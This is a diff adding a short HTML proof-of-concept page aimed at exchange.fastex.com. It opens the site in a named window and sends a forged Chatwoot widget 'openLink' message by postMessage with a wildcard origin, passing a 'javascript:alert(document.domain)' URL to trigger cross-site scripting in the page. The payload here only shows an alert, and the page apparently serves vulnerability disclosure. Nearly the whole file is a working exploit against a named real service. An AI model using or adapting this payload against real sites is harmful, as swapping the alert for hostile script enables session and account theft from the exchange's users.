@@ -1,0 +1,28 @@
+<html>
+
+<head></head>
+
+<body>
+    <button onclick="open_fastex()">click me to open exchange.fastex.com</button>
+    <button onclick="start_send_s()">click me to send xss payload</button>
+
+    <script>
+        window.addEventListener("message", (msg) => {
+            console.log("got message", msg);
+            alert(msg.data);
+        });
+
+        function start_send_s() {
+
+            win.postMessage('chatwoot-widget:{"event":"openLink","data":{"url":"javascript:alert(document.domain)//","target":"_self"}}', "*")
+        }
+
+        async function open_fastex() {
+
+            win = window.open("https://exchange.fastex.com/", "transact");
+
+        }
+    </script>
+</body>
+
+</html>
